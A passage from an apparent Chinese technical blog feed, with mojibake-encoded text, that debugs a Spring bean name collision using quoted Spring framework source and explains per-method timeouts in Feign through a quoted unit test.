always ignored: Inner beans are anonymous prototypes.</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;A RuntimeBeanReference, which must be resolved.</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;A ManagedList. This is a special collection that may contain</span></span><br><span class="line"><span class="comment">	 * RuntimeBeanReferences or Collections that will need to be resolved.</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;A ManagedSet. May also contain RuntimeBeanReferences or</span></span><br><span class="line"><span class="comment">	 * Collections that will need to be resolved.</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;A ManagedMap. In this case the value may be a RuntimeBeanReference</span></span><br><span class="line"><span class="comment">	 * or Collection that will need to be resolved.</span></span><br><span class="line"><span class="comment">	 * &lt;li&gt;An ordinary object or &#123;<span class="doctag">@code</span> null&#125;, in which case it's left alone.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> argName the name of the argument that the value is defined for</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> value the value object to resolve</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the resolved object</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Nullable</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Object <span class="title">resolveValueIfNecessary</span><span class="params">(Object argName, @Nullable Object value)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// We must check each value to see whether it requires a runtime reference</span></span><br><span class="line">		<span class="comment">// to another bean to be resolved.</span></span><br><span class="line">		<span class="keyword">if</span> (value <span class="keyword">instanceof</span> RuntimeBeanReference) &#123;</span><br><span class="line">      <span class="comment">// åœ¨è¿™é‡Œå¤„ç†çš„ï¼ï¼ï¼</span></span><br><span class="line">			RuntimeBeanReference ref = (RuntimeBeanReference) value;</span><br><span class="line">			<span class="keyword">return</span> resolveReference(argName, ref);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> RuntimeBeanNameReference) &#123;</span><br><span class="line">			String refName = ((RuntimeBeanNameReference) value).getBeanName();</span><br><span class="line">			refName = String.valueOf(doEvaluate(refName));</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">this</span>.beanFactory.containsBean(refName)) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(</span><br><span class="line">						<span class="string">"Invalid bean name '"</span> + refName + <span class="string">"' in bean reference for "</span> + argName);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> refName;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> BeanDefinitionHolder) &#123;</span><br><span class="line">			<span class="comment">// Resolve BeanDefinitionHolder: contains BeanDefinition with name and aliases.</span></span><br><span class="line">			BeanDefinitionHolder bdHolder = (BeanDefinitionHolder) value;</span><br><span class="line">			<span class="keyword">return</span> resolveInnerBean(argName, bdHolder.getBeanName(), bdHolder.getBeanDefinition());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> BeanDefinition) &#123;</span><br><span class="line">			<span class="comment">// Resolve plain BeanDefinition, without contained name: use dummy name.</span></span><br><span class="line">			BeanDefinition bd = (BeanDefinition) value;</span><br><span class="line">			String innerBeanName = <span class="string">"(inner bean)"</span> + BeanFactoryUtils.GENERATED_BEAN_NAME_SEPARATOR +</span><br><span class="line">					ObjectUtils.getIdentityHexString(bd);</span><br><span class="line">			<span class="keyword">return</span> resolveInnerBean(argName, innerBeanName, bd);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedArray) &#123;</span><br><span class="line">			<span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line">			ManagedArray array = (ManagedArray) value;</span><br><span class="line">			Class&lt;?&gt; elementType = array.resolvedElementType;</span><br><span class="line">			<span class="keyword">if</span> (elementType == <span class="keyword">null</span>) &#123;</span><br><span class="line">				String elementTypeName = array.getElementTypeName();</span><br><span class="line">				<span class="keyword">if</span> (StringUtils.hasText(elementTypeName)) &#123;</span><br><span class="line">					<span class="keyword">try</span> &#123;</span><br><span class="line">						elementType = ClassUtils.forName(elementTypeName, <span class="keyword">this</span>.beanFactory.getBeanClassLoader());</span><br><span class="line">						array.resolvedElementType = elementType;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">						<span class="comment">// Improve the message by showing the context.</span></span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line">								<span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line">								<span class="string">"Error resolving array type for "</span> + argName, ex);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					elementType = Object<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> resolveManagedArray(argName, (List&lt;?&gt;) value, elementType);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedList) &#123;</span><br><span class="line">			<span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line">			<span class="keyword">return</span> resolveManagedList(argName, (List&lt;?&gt;) value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedSet) &#123;</span><br><span class="line">			<span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line">			<span class="keyword">return</span> resolveManagedSet(argName, (Set&lt;?&gt;) value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedMap) &#123;</span><br><span class="line">			<span class="comment">// May need to resolve contained runtime references.</span></span><br><span class="line">			<span class="keyword">return</span> resolveManagedMap(argName, (Map&lt;?, ?&gt;) value);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> ManagedProperties) &#123;</span><br><span class="line">			Properties original = (Properties) value;</span><br><span class="line">			Properties copy = <span class="keyword">new</span> Properties();</span><br><span class="line">			original.forEach((propKey, propValue) -&gt; &#123;</span><br><span class="line">				<span class="keyword">if</span> (propKey <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line">					propKey = evaluate((TypedStringValue) propKey);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (propValue <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line">					propValue = evaluate((TypedStringValue) propValue);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (propKey == <span class="keyword">null</span> || propValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line">							<span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line">							<span class="string">"Error converting Properties key/value pair for "</span> + argName + <span class="string">": resolved to null"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				copy.put(propKey, propValue);</span><br><span class="line">			&#125;);</span><br><span class="line">			<span class="keyword">return</span> copy;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> TypedStringValue) &#123;</span><br><span class="line">			<span class="comment">// Convert value to target type here.</span></span><br><span class="line">			TypedStringValue typedStringValue = (TypedStringValue) value;</span><br><span class="line">			Object valueObject = evaluate(typedStringValue);</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Class&lt;?&gt; resolvedTargetType = resolveTargetType(typedStringValue);</span><br><span class="line">				<span class="keyword">if</span> (resolvedTargetType != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">this</span>.typeConverter.convertIfNecessary(valueObject, resolvedTargetType);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">return</span> valueObject;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">				<span class="comment">// Improve the message by showing the context.</span></span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanCreationException(</span><br><span class="line">						<span class="keyword">this</span>.beanDefinition.getResourceDescription(), <span class="keyword">this</span>.beanName,</span><br><span class="line">						<span class="string">"Error converting typed String value for "</span> + argName, ex);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> NullBean) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> evaluate(value);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>debugçœ‹äº†ä¸‹ï¼Œä¹Ÿç¡®å®æ˜¯å¯¹çš„ï¼š</p>
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429120415453.png">
<p>è·Ÿè¿›å»ï¼Œ å‘ç°ï¼š</p>
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429120839555.png">
<p>è€çš„daoå±‚å…³è”çš„sessionFactoryå±…ç„¶æ˜¯æ–°çš„ï¼ˆæ‰«æè·¯å¾„ä¸ä¸€æ ·ï¼Œè¿™é‡ŒåªåŠ è½½äº†æ–°çš„mapperæ–‡ä»¶ï¼‰ã€‚æ ¹æ®åç§°è·å–ä¸€æŠŠï¼š</p>
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429121457725.png">
<h2 id="beanæ³¨å†Œ"><a href="#beanæ³¨å†Œ" class="headerlink" title="beanæ³¨å†Œ"></a>beanæ³¨å†Œ</h2><img src="/2020/04/29/spring-bean-duplic-name/image-20200429125600021.png">
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429125633517.png">
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//---------------------------------------------------------------------</span></span><br><span class="line">	<span class="comment">// Implementation of BeanDefinitionRegistry interface</span></span><br><span class="line">	<span class="comment">//---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerBeanDefinition</span><span class="params">(String beanName, BeanDefinition beanDefinition)</span></span></span><br><span class="line"><span class="function">			<span class="keyword">throws</span> BeanDefinitionStoreException </span>&#123;</span><br><span class="line"></span><br><span class="line">		Assert.hasText(beanName, <span class="string">"Bean name must not be empty"</span>);</span><br><span class="line">		Assert.notNull(beanDefinition, <span class="string">"BeanDefinition must not be null"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (beanDefinition <span class="keyword">instanceof</span> AbstractBeanDefinition) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				((AbstractBeanDefinition) beanDefinition).validate();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (BeanDefinitionValidationException ex) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,</span><br><span class="line">						<span class="string">"Validation of bean definition failed"</span>, ex);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿™é‡Œå‘ç”Ÿäº†è¦†ç›–</span></span><br><span class="line">		BeanDefinition existingDefinition = <span class="keyword">this</span>.beanDefinitionMap.get(beanName);</span><br><span class="line">		<span class="keyword">if</span> (existingDefinition != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!isAllowBeanDefinitionOverriding()) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,</span><br><span class="line">						<span class="string">"Cannot register bean definition ["</span> + beanDefinition + <span class="string">"] for bean '"</span> + beanName +</span><br><span class="line">						<span class="string">"': There is already ["</span> + existingDefinition + <span class="string">"] bound."</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (existingDefinition.getRole() &lt; beanDefinition.getRole()) &#123;</span><br><span class="line">				<span class="comment">// e.g. was ROLE_APPLICATION, now overriding with ROLE_SUPPORT or ROLE_INFRASTRUCTURE</span></span><br><span class="line">				<span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">					logger.warn(<span class="string">"Overriding user-defined bean definition for bean '"</span> + beanName +</span><br><span class="line">							<span class="string">"' with a framework-generated bean definition: replacing ["</span> +</span><br><span class="line">							existingDefinition + <span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (!beanDefinition.equals(existingDefinition)) &#123;</span><br><span class="line">        <span class="comment">// èµ°åˆ°äº†è¿™é‡Œï¼Œæ‰“å°äº†overrideçš„æ—¥å¿—ï¼Œä¸è¿‡æ˜¯infoçº§åˆ«çš„</span></span><br><span class="line">				<span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">					logger.info(<span class="string">"Overriding bean definition for bean '"</span> + beanName +</span><br><span class="line">							<span class="string">"' with a different definition: replacing ["</span> + existingDefinition +</span><br><span class="line">							<span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">					logger.debug(<span class="string">"Overriding bean definition for bean '"</span> + beanName +</span><br><span class="line">							<span class="string">"' with an equivalent definition: replacing ["</span> + existingDefinition +</span><br><span class="line">							<span class="string">"] with ["</span> + beanDefinition + <span class="string">"]"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (hasBeanCreationStarted()) &#123;</span><br><span class="line">				<span class="comment">// Cannot modify startup-time collection elements anymore (for stable iteration)</span></span><br><span class="line">				<span class="keyword">synchronized</span> (<span class="keyword">this</span>.beanDefinitionMap) &#123;</span><br><span class="line">					<span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">					List&lt;String&gt; updatedDefinitions = <span class="keyword">new</span> ArrayList&lt;&gt;(<span class="keyword">this</span>.beanDefinitionNames.size() + <span class="number">1</span>);</span><br><span class="line">					updatedDefinitions.addAll(<span class="keyword">this</span>.beanDefinitionNames);</span><br><span class="line">					updatedDefinitions.add(beanName);</span><br><span class="line">					<span class="keyword">this</span>.beanDefinitionNames = updatedDefinitions;</span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">this</span>.manualSingletonNames.contains(beanName)) &#123;</span><br><span class="line">						Set&lt;String&gt; updatedSingletons = <span class="keyword">new</span> LinkedHashSet&lt;&gt;(<span class="keyword">this</span>.manualSingletonNames);</span><br><span class="line">						updatedSingletons.remove(beanName);</span><br><span class="line">						<span class="keyword">this</span>.manualSingletonNames = updatedSingletons;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// Still in startup registration phase</span></span><br><span class="line">				<span class="keyword">this</span>.beanDefinitionMap.put(beanName, beanDefinition);</span><br><span class="line">				<span class="keyword">this</span>.beanDefinitionNames.add(beanName);</span><br><span class="line">				<span class="keyword">this</span>.manualSingletonNames.remove(beanName);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">this</span>.frozenBeanDefinitionNames = <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (existingDefinition != <span class="keyword">null</span> || containsSingleton(beanName)) &#123;</span><br><span class="line">			resetBeanDefinition(beanName);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429125804639.png">
<h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><p>æœ€ç»ˆæ’æŸ¥ä¸‹æ¥ï¼Œå‘ç°åªæ˜¯beançš„åç§°é‡å¤ï¼Œå¯¼è‡´è¦†ç›–ï¼›è·Ÿ<code>@Primary</code>æ²¡æœ‰å…³ç³»ã€‚åœ¨æˆæ–‡çš„è¿‡ç¨‹ä¸­åˆä¸€èµ·<strong>ä¸åŠ æ€ç´¢åœ°å¤åˆ¶ç²˜è´´</strong>å¼•èµ·çš„æ•…éšœ</p>
<img src="/2020/04/29/spring-bean-duplic-name/image-20200429130442650.png">
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of <span class="built_in">type</span> <span class="string">'com.atour.pay.api.remote.statistics.TransStatisticsRemote'</span> available</span><br><span class="line">	at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:347)</span><br><span class="line">	at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:334)</span><br><span class="line">	at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1103)</span><br></pre></td></tr></table></figure>
<p>è¿˜æ˜¯éœ€è¦ä¿æŒæ•¬ç•ä¹‹å¿ƒï¼Œå¤šå»äº†è§£ï¼Œä¸èƒ½æ— è„‘çš„ç²˜è´´ã€‚åŒæ—¶æˆ‘ä»¬çš„åŸºç¡€å»ºè®¾ä¸å¤Ÿå®Œå–„ï¼Œæ‰å¯¼è‡´äº†è¿™ä¹ˆå¤šå¤åˆ¶ç²˜è´´çš„ä»£ç ï¼Œé“é˜»ä¸”é•¿ï¼</p>
<p>è¦†ç›–çš„è§„åˆ™å¯ä»¥å‚è€ƒï¼Œ <a href="https://blog.csdn.net/f641385712/article/details/93777536" rel="external nofollow noopener noreferrer" target="_blank">èŠèŠSpringçš„beanè¦†ç›–ï¼ˆå­˜åœ¨åŒåname/idé—®é¢˜ï¼‰ï¼Œä»‹ç»Springåç§°ç”Ÿæˆç­–ç•¥æ¥å£BeanNameGeneratorã€äº«å­¦Springã€‘_Java_BATçš„ä¹Œæ‰˜é‚¦-CSDNåšå®¢</a>, è¿™é‡Œç®€å•è´´ä¸‹ç»“è®ºï¼š</p>
<blockquote>
<ul>
<li>åŒä¸€ä¸ªé…ç½®æ–‡ä»¶å†…åŒåçš„<code>Bean</code>ï¼Œ<strong>ä»¥æœ€ä¸Šé¢å®šä¹‰çš„ä¸ºå‡†</strong></li>
<li>ä¸åŒé…ç½®æ–‡ä»¶ä¸­å­˜åœ¨åŒåBeanï¼Œ<code>åè§£æ</code>çš„é…ç½®æ–‡ä»¶ä¼šè¦†ç›–<code>å…ˆè§£æ</code>çš„é…ç½®æ–‡ä»¶ï¼ˆé…ç½®æ–‡ä»¶çš„å…ˆåé¡ºåºå…¶å®ä¼šå—åˆ°<code>@Order</code>æ¥æ§åˆ¶ï¼‰</li>
<li>é€šè¿‡<code>@ComponentScan</code>æ‰«æè¿›æ¥çš„ä¼˜å…ˆçº§æ˜¯æœ€ä½çš„ï¼ŒåŸå› å°±æ˜¯å®ƒæ‰«æè¿›æ¥çš„Beanå®šä¹‰æ˜¯<strong>æœ€å…ˆ</strong>è¢«æ³¨å†Œçš„~</li>
<li>åœ¨ä¸åŒå®¹å™¨å†…ï¼Œå³ä½¿<code>Bean</code>åç§°ç›¸åŒï¼Œå®ƒä»¬ä¹Ÿæ˜¯èƒ½å¤Ÿ<strong>å’Œè°å…±å­˜</strong>çš„ï¼ˆæƒ³æƒ³çˆ¶å­å®¹å™¨ï¼‰</li>
</ul>
</blockquote>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://www.iflym.com/index.php/code/201208290002.html" rel="external nofollow noopener noreferrer" target="_blank">Springä¸­è·å–ä¸€ä¸ªbeançš„æµç¨‹-2 â€“ i flym</a></li>
<li><a href="https://blog.csdn.net/f641385712/article/details/93777536" rel="external nofollow noopener noreferrer" target="_blank">èŠèŠSpringçš„beanè¦†ç›–ï¼ˆå­˜åœ¨åŒåname/idé—®é¢˜ï¼‰ï¼Œä»‹ç»Springåç§°ç”Ÿæˆç­–ç•¥æ¥å£BeanNameGeneratorã€äº«å­¦Springã€‘_Java_BATçš„ä¹Œæ‰˜é‚¦-CSDNåšå®¢</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring-bean </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Feignæ–¹æ³•çº§åˆ«çš„è¶…æ—¶]]></title>
      <url>http://qsli.github.io/2020/04/28/feign-method-timeout/</url>
      <content type="html"><![CDATA[<img src="/2020/04/28/feign-method-timeout/image-20200428135947174.png">
<h2 id="Feignæ–¹æ³•çº§åˆ«çš„è¶…æ—¶"><a href="#Feignæ–¹æ³•çº§åˆ«çš„è¶…æ—¶" class="headerlink" title="Feignæ–¹æ³•çº§åˆ«çš„è¶…æ—¶"></a>Feignæ–¹æ³•çº§åˆ«çš„è¶…æ—¶</h2><ul>
<li><p>discussion</p>
<p><a href="https://github.com/OpenFeign/feign/issues/562" rel="external nofollow noopener noreferrer" target="_blank">Per request timeout options Â· Issue #562 Â· OpenFeign/feign</a></p>
</li>
<li><p>ç‰ˆæœ¬ &gt;= 10.3.0</p>
</li>
</ul>
<img src="/2020/04/28/feign-method-timeout/WeChatWorkScreenshot_cb1954f6-abee-48ad-8dc5-14e9ef579bb9.png">
<ul>
<li>æºç ä¸­çš„å•æµ‹ï¼š</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> pengfei.zhao</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"deprecation"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OptionsTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">interface</span> <span class="title">OptionsInterface</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestLine</span>(<span class="string">"GET /"</span>)</span><br><span class="line">    <span class="comment">// å‚æ•°ä¸­å¤šäº†ä¸€ä¸ªè¶…æ—¶çš„é…ç½®</span></span><br><span class="line">    <span class="function">String <span class="title">get</span><span class="params">(Request.Options options)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestLine</span>(<span class="string">"GET /"</span>)</span><br><span class="line">    <span class="function">String <span class="title">get</span><span class="params">()</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Rule</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">final</span> ExpectedException thrown = ExpectedException.none();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * æµ‹è¯•æ€»çš„é…ç½®ä¼šå¯¼è‡´è¶…æ—¶</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">socketTimeoutTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MockWebServer server = <span class="keyword">new</span> MockWebServer();</span><br><span class="line">    server.enqueue(<span class="keyword">new</span> MockResponse().setBody(<span class="string">"foo"</span>).setBodyDelay(<span class="number">3</span>, TimeUnit.SECONDS));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> OptionsInterface api = Feign.builder()</span><br><span class="line">        .options(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">1000</span>))</span><br><span class="line">        .target(OptionsInterface.class, server.url("/").toString());</span><br><span class="line"></span><br><span class="line">    thrown.expect(FeignException<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    thrown.expectCause(CoreMatchers.isA(SocketTimeoutException<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line"></span><br><span class="line">    api.get();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * æ¥å£çº§åˆ«çš„é…ç½®å¯ä»¥è¦†ç›–æ€»çš„é…ç½®ï¼Œä»è€Œåœ¨ç­‰å¾…3sä¹‹åæ‹¿åˆ°ç»“æœ</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">normalResponseTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MockWebServer server = <span class="keyword">new</span> MockWebServer();</span><br><span class="line">    server.enqueue(<span class="keyword">new</span> MockResponse().setBody(<span class="string">"foo"</span>).setBodyDelay(<span class="number">3</span>, TimeUnit.SECONDS));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> OptionsInterface api = Feign.builder()</span><br><span class="line">        .options(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">1000</span>))</span><br><span class="line">        .target(OptionsInterface.class, server.url("/").toString());</span><br><span class="line"></span><br><span class="line">    assertThat(api.get(<span class="keyword">new</span> Request.Options(<span class="number">1000</span>, <span class="number">4</span> * <span class="number">1000</span>))).isEqualTo(<span class="string">"foo"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
